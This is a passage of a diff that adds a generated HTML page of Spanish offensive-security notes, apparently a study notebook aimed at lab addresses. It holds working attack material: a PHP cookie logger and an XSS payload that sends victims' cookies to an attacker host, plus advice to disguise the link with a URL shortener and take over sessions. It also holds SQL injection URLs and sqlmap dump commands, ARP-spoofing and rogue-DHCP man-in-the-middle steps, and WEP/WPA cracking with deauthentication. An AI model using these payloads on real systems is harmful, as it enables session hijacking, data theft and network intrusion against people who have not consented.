+    <span class="nv">$handle</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;cookies_list.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span>
+    <span class="nb">fputs</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cookie&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+
+<p>comprobar que funciona <code>10.1.1.3/cookies.php?cookie=test</code> </p>
+<p>código a inyectar mediante xss</p>
+<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">();</span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.3/cookies.php?cookie=&quot;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>este código hay que insertarlo dentro de algún cuadro de texto vulnerable y mediante un acortador de url como https://bitly.com/  crear un link.</p>
+<p>Una vez recogidas las coockies, con mantra u otro insertarnos las cookies estraidas para acceder a la sesión de la victima.</p>
+<h5 id="evasion-de-filtros">Evasión de filtros</h5>
+<p>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion</p>
+<p>https://html5sec.org/</p>
+<h4 id="sql-injection">sql injection</h4>
+<p>https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</p>
+<div class="codehilite"><pre><span></span><code><span class="o">#</span> <span class="n">extraer</span> <span class="n">bases</span> <span class="n">de</span> <span class="n">datos</span>
+<span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">9</span><span class="o">/</span><span class="n">sqli</span><span class="o">/</span><span class="n">example1</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">name</span><span class="o">=</span><span class="n">root</span><span class="s1">&#39;+and+&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">0</span><span class="s1">&#39;+union+select+1,schema_name,3,4,5+from+information_schema.schemata+--+-</span>
+<span class="s1">existe la tabla exercises</span>
+
+<span class="s1"># extraer tablas</span>
+<span class="s1">10.1.1.9/sqli/example1.php?name=root&#39;</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="k">union</span><span class="o">+</span><span class="k">select</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="o">+</span><span class="k">where</span><span class="o">+</span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;exercises&#39;</span><span class="o">+</span><span class="c1">--+-</span>
+<span class="n">existe</span> <span class="n">la</span> <span class="n">tabla</span> <span class="n">users</span>
+
+<span class="o">#</span> <span class="n">extraer</span> <span class="n">columnas</span>
+<span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">9</span><span class="o">/</span><span class="n">sqli</span><span class="o">/</span><span class="n">example1</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">name</span><span class="o">=</span><span class="n">root</span><span class="s1">&#39;+and+&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">0</span><span class="s1">&#39;+union+select+1,column_name,3,4,5+from+information_schema.columns+where+table_name=&#39;</span><span class="n">users</span><span class="err">&#39;</span><span class="o">+</span><span class="c1">--+-</span>
+</code></pre></div>
+
+<h5 id="sqlmap">sqlmap</h5>
+<div class="codehilite"><pre><span></span><code>sqlmap -u <span class="s2">&quot;http://10.1.1.9/sqli/xample1.php?name=root&quot;</span>
+sqlmap -u <span class="s2">&quot;http://10.1.1.9/sqli/xample1.php?name=root&quot;</span> --dbs
+sqlmap -u <span class="s2">&quot;http://10.1.1.9/sqli/xample1.php?name=root&quot;</span> -D exercices --tables
+sqlmap -u <span class="s2">&quot;http://10.1.1.9/sqli/xample1.php?name=root&quot;</span> -D exercices -T users --columns
+sqlmap -u <span class="s2">&quot;http://10.1.1.9/sqli/xample1.php?name=root&quot;</span> -D exercices -T users --dump
+sqlmap -u <span class="s2">&quot;http://10.1.1.9/sqli/xample1.php?name=root&quot;</span> --sql-shell
+</code></pre></div>
+
+<h2 id="vulnerabilidades-en-red">vulnerabilidades en red</h2>
+<h3 id="analisis-de-trafico">Análisis de trafico</h3>
+<p>Existen diferentes programas con los que podemos analizar el trafico en la red, el mas conocido  <strong>wireshark</strong> que analiza todo el trafico, también existen otros como <strong>network miner</strong> que de forma pasiva va extrayendo datos de los paquetes que van circulando por la red y mostrándolos de forma ordenada.</p>
+<h3 id="intercepcion-de-trafico-man-in-the-midle">intercepción de trafico <em>(man in the midle)</em></h3>
+<p>De forma <strong>manual</strong> podemos ponernos entre medio de la victima y el router para interceptar todo el trafico de un dispositivo.</p>
+<p>Siempre que estemos en una red local podemos indicar que nuestro dispositivo pueda hacer pas forwarding y seguidamente mediante <code>arpspoof</code> indicar a un host que nosotros somos el router.</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward
+<span class="c1"># prg       interficie  victima router</span>
+arpspoof -i eth0 -t <span class="m">10</span>.1.1.32 <span class="m">10</span>.1.1.1
+</code></pre></div>
+
+<blockquote>
+<p>realmente lo que hace <code>arpspoof</code> es mandar a la victima paquetes de que mi mac es la perteneciente va la ip del router.</p>
+</blockquote>
+<p>De forma <strong>automática</strong> podemos utilizar <code>bettercap</code> que se encarga de realizar todo el proceso automáticamente, además de tener funcionalidades extra. </p>
+<div class="codehilite"><pre><span></span><code>arp-scan <span class="m">10</span>.1.1.0/24 <span class="c1"># ver numero de dispositivos en una red</span>
+bettercap --help
+bettercap -X <span class="c1"># man in de middle a todos los dispositivos de la red</span>
+bettercap -T <span class="m">10</span>.1.1.32 --proxy -P POST <span class="c1"># solo una victima</span>
+</code></pre></div>
+
+<p>Desde windows existen programas como <strong>cain</strong> que podemos hacer el <em>man in de middle</em> fácilmente. Es un programa portable que solo tendrás que configurar la sección <code>apr</code> que será entre que dispositivos quieres estar y listo.</p>
+<h4 id="dhcp-falso">dhcp falso</h4>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward
+msfconsole
+use auxiliary/server/dhcp
+show options
+<span class="nb">set</span> broadcast <span class="m">10</span>.1.1.255
+<span class="c1"># rango a dar</span>
+<span class="nb">set</span> dhcpipend <span class="m">10</span>.1.1.200
+<span class="nb">set</span> dhcpipstart <span class="m">10</span>.1.1.190
+
+<span class="nb">set</span> dnsserver <span class="m">8</span>.8.8.8
+<span class="nb">set</span> netmask <span class="m">255</span>.255.255.0
+
+<span class="nb">set</span> router <span class="m">10</span>.1.1.22 <span class="c1"># mi direccion ip, me are pasar por el router</span>
+<span class="nb">set</span> srvhost <span class="m">10</span>.11.22 <span class="c1"># servidor dhcp</span>
+exploit
+</code></pre></div>
+
+<h3 id="vulnerabilidades-wifi">vulnerabilidades wifi</h3>
+<p><strong>modo monitor</strong> </p>
+<p>Este modo sirve para que nuestra tarjeta se ponga a la escucha del trafico de la red, no solo el nuestro si no el de todo el mundo si estamos en un entorno wifi.</p>
+<div class="codehilite"><pre><span></span><code>airmon-ng check <span class="nb">kill</span>
+airmon-ng start wlan0
+airodump-ng wlan0mon <span class="c1"># ver redes ssid bssid potencia de red chanel, etc...</span>
+airmon-ng stop wlan0mon
+</code></pre></div>
+
+<p><strong>redes wep</strong>    </p>
+<p>capturar pequetes red especifica</p>
+<div class="codehilite"><pre><span></span><code>airodump-ng -c <span class="m">6</span> --bssid  mac-del-router -w file-trafic wlan0mon
+</code></pre></div>
+
+<p>asociarte al punto de acceso</p>
+<div class="codehilite"><pre><span></span><code>aireplay-ng -1 <span class="m">0</span> -e pruebas -a mac-del-router -h mac-cliente wlan0mon
+</code></pre></div>
+
+<p>escuchar paquetes arp</p>
+<div class="codehilite"><pre><span></span><code>aireplay-ng -3 -b mac-router -h mac-cliente wlan0mon
+</code></pre></div>
+
+<p>desautenticar cliente</p>
+<div class="codehilite"><pre><span></span><code>aireplay-ng -0 <span class="m">1</span> -a mac-router -c mac-cliente wlan0mon
+</code></pre></div>
+
+<p>craquear</p>
+<div class="codehilite"><pre><span></span><code>aircrack-ng file-trafic
+</code></pre></div>
+
+<p><strong>redes wpa/wpa2</strong>  </p>
+<div class="codehilite"><pre><span></span><code>airmon-ng start wlan0
+<span class="c1"># extraer handshake y parar la escucha</span>
+airodump-ng -c <span class="m">6</span> --bssid mac-router -w file-trafic-wpa wlan0mon
+<span class="c1"># intntar craquear handshake con diccionario local</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt file-trafic-wpa 
+</code></pre></div>
+
+<p><strong>automático</strong> </p>
+<p>De forma automática se puede intentar vulnerar una red con <code>wifite</code> ya vque por debajo esta utilizando <code>aircrack</code> . </p>
+<div class="codehilite"><pre><span></span><code>wifite
+indicar en el listado la red
+</code></pre></div>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../administracion/redes/redes2/" title="Redes2" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Redes2
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../bases_datos/mongo/Mongo/" title="Mongo" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Mongo
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org" target="_blank" rel="noopener">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.c33a9706.js"></script>
+      
+      <script>app.initialize({version:"1.1",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
